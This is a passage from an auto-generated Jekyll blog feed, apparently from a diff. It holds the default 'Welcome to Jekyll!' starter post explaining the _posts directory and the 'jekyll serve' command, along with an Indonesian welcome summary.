+&lt;noscript&gt;Please enable JavaScript to view the &lt;a href=&quot;https://disqus.com/?ref_noscript&quot;&gt;comments powered by Disqus.&lt;/a&gt;&lt;/noscript&gt;</content><author><name></name></author><summary type="html">Selamat datang di Blog ini</summary></entry><entry><title type="html">Welcome to Jekyll!</title><link href="http://localhost:4000/jekyll/update/2019/04/07/welcome-to-jekyll.html" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2019-04-07T01:09:15+08:00</published><updated>2019-04-07T01:09:15+08:00</updated><id>http://localhost:4000/jekyll/update/2019/04/07/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2019/04/07/welcome-to-jekyll.html">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
 
 &lt;p&gt;To add new posts, simply add a file in the &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory that follows the convention &lt;code class=&quot;highlighter-rouge&quot;&gt;YYYY-MM-DD-name-of-post.ext&lt;/code&gt; and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;
 
